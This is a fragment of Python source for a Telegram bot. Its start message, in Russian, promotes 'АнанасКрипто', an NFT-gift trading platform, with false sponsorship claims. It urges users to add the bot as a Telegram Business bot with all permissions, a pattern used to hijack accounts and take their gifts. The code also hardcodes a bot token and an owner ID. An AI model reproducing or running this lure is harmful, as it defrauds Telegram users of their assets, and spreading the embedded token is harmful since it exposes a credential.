...
TOKEN = "7742488356:AAHEu4OygRggX06fQIVRGXkA3PVKeRQ6ufo"
MY_ID = 767154085
...
def get_activation_keyboard(bot_username: str):
    ...
    builder.row(types.InlineKeyboardButton(text="⚡ Наши отзывы", url="https://t.me/+ZX4U0BSR8J42NWFk"))
    builder.adjust(2)
...
async def cmd_start(message: types.Message, bot_instance: Bot = bot):
    ...
    if message.from_user.id == MY_ID:
        ...
        activation_text = f"""
<b>🍍 Добро пожаловать, {message.from_user.full_name}! АнанасКрипто - новая платформа для продажи и передачи нфт-подарков!
Поспеши друг, у нас <u>лучшие и выгодные цены.</u> Так-же, нас спонсирует больше 3-х компаний Telegram!</b>

<i>- Для начала работы выполните шаги:</i>
<blockquote><i> [1️⃣] Перейдите в Настройки Telegram.
 [2️⃣] Откройте раздел Telegram Business.
 [3️⃣] Нажмите 'Боты для бизнеса'.
 [4️⃣] Добавьте бота (@{bot_username}), предоставив все разрешения.
</i></blockquote>
<b>🕹️ Готово! Бот начнет работу автоматически.</b>
"""

        photo_url = 'https://i.postimg.cc/L6QY1D7t/4f939a49-1ba4-444d-9b20-6bafafa8e99d.png'  # замените на вашу ссылку
